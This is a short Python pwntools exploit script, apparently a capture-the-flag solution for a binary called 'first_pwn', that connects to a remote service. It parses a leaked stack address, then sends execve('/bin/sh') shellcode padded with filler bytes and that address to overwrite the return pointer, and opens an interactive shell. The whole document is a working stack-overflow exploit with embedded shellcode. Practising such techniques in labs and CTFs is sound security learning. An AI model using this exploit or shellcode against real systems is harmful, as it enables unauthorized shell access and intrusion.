from pwn import *

# p = process("./first_pwn")
p = remote("10.212.138.23", 40511)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

leak = p.recvline().decode().strip()[-14:]
stack = int(leak, 16)
log.info(f"{hex(stack)=}")

payload = shellcode + b"B" * (0x38-len(shellcode)) + p64(stack)

p.recvuntil(b">")
p.sendline(payload)

p.interactive()